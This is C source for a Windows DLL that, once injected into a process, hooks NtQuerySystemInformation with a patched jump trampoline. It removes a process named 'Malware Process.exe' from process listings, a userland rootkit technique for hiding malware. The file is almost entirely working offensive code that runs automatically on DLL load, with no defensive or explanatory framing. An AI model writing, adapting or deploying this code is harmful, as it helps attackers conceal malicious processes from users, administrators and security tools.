#include <windows.h>
#include <winternl.h>
#pragma comment(lib,"ntdll.lib")

LPVOID	ProcAdd;
SIZE_T	nobytes;
unsigned char orgopc[16] = { 0 };


unsigned char	patchOpcodes[16] = { 0x48, 0xb8,
									0, 0, 0, 0, 0, 0, 0, 0,
									0xff, 0xe0, 0x90, 0x90, 0x90, 0x90
};

LPCWSTR P2Hide = L"Malware Process.exe";

__kernel_entry NTSTATUS
NTAPI __stdcall
FNtQuerySystemInformation(
	IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
	OUT PVOID SystemInformation,
	IN ULONG SystemInformationLength,
	OUT PULONG ReturnLength OPTIONAL
) {
	NTSTATUS nret = 0;

	PSYSTEM_PROCESS_INFORMATION procInfo = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;

	if (!WriteProcessMemory(GetCurrentProcess(), ProcAdd, orgopc, sizeof(patchOpcodes), NULL))
		exit(-1);

	if (!NT_SUCCESS(nret = NtQuerySystemInformation(SystemInformationClass, procInfo, SystemInformationLength, ReturnLength)))
		exit(-1);

	if (!WriteProcessMemory(GetCurrentProcess(), ProcAdd, patchOpcodes, sizeof(patchOpcodes), NULL))
		exit(-1);

	if (SystemInformationClass == SystemProcessInformation)
	{
		PSYSTEM_PROCESS_INFORMATION NextOffsetData = procInfo;

		while (procInfo->NextEntryOffset)
		{
			NextOffsetData = (PSYSTEM_PROCESS_INFORMATION)((LPBYTE)NextOffsetData + NextOffsetData->NextEntryOffset);

			if (NextOffsetData->NextEntryOffset == 0)
			{
				procInfo->NextEntryOffset = 0;
			}
			if (!lstrcmpiW(NextOffsetData->ImageName.Buffer, P2Hide))
			{
				procInfo->NextEntryOffset = procInfo->NextEntryOffset + NextOffsetData->NextEntryOffset;
			}

			procInfo = (PSYSTEM_PROCESS_INFORMATION)((LPBYTE)procInfo + procInfo->NextEntryOffset);
		}
	}
	return(nret);
}

int HideProcess()
{
	ProcAdd = GetProcAddress(LoadLibraryA("Ntdll.dll"), "NtQuerySystemInformation");

	if (!ProcAdd)
		return (-1);
	void* tvoid = &FNtQuerySystemInformation;

	if (!ReadProcessMemory(GetCurrentProcess(), ProcAdd, orgopc, sizeof(patchOpcodes), NULL))
		return (-1);
	memcpy_s(patchOpcodes + 2, 8, &tvoid, 8);

	if (!WriteProcessMemory(GetCurrentProcess(), ProcAdd, patchOpcodes, sizeof(patchOpcodes), NULL))
		return (-1);
}



BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	switch (ul_reason_for_call)
	{
		case DLL_PROCESS_ATTACH:
			HideProcess();
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
		case DLL_PROCESS_DETACH:
			break;
	}
	return TRUE;
}
